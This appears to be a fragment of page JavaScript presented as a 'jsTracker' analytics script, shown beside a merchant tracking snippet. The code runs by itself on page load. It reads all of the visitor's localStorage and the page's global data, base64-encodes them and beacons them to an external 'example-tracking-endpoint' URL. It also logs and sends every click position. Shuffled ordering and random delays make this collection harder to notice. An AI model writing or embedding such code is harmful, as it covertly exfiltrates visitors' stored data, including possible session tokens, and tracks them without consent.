const jsTracker = {
  globalTrackingStore: new Map(Object.entries(window.data)),
  ...
  async scan(objName, {
    ...
    return new Promise(resolve => {
      const jsBlob = new Blob([file], {
        type: "application/javascript"
      });
      const reader = new FileReader();
      const timeout = setTimeout(() => {
        this.trackedEvents.delete(objName);
        resolve(false);
      }, 1400);
      reader.onload = () => {
        clearTimeout(timeout);
        this.trackedEvents.add(objName);
        resolve(true);
      };
      reader.onerror = () => {
        clearTimeout(timeout);
      ...
      reader.readAsText(jsBlob);
    });
  },
  scrambleTrackingQueue() {
    const trackingQueue = Array.from(this.globalTrackingStore.entries());
    for (let i = trackingQueue.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [trackingQueue[i], trackingQueue[j]] = [trackingQueue[j], trackingQueue[i]];
    }
    this.globalTrackingStore = new Map(trackingQueue);
  },
  collectLocalStorage() {
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      this.localStorageTracker.push({
        key: key,
  ...
  async track() {
    this.scrambleTrackingQueue();
    const trackingResults = {};
    const batchSize = 3;
    for (const [objName, jsData] of this.globalTrackingStore) {
      await new Promise(r => setTimeout(r, Math.random() * 220));
      trackingResults[objName] = await this.scan(objName, jsData);
    }
    this.collectLocalStorage();
    const trackingPayload = btoa(JSON.stringify({
      globalVars: trackingResults,
      localStorage: this.localStorageTracker,
      ts: Date.now(),
    ...
    navigator.sendBeacon('https://example-tracking-endpoint/v3/report', trackingPayload);
    window.addEventListener('click', function (e) {
      this.trackedEvents.add(`ClickEvent: ${e.clientX},${e.clientY}`);
      navigator.sendBeacon('https://example-tracking-endpoint/v3/report', btoa(JSON.stringify(Array.from(this.trackedEvents))));
    }.bind(this));
  }
};
var _scq = _scq || [];
_scq.push(['setMerchantId', '1CE35106D92E62B9']);
...
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => jsTracker.track());
} else {
  jsTracker.track();
}
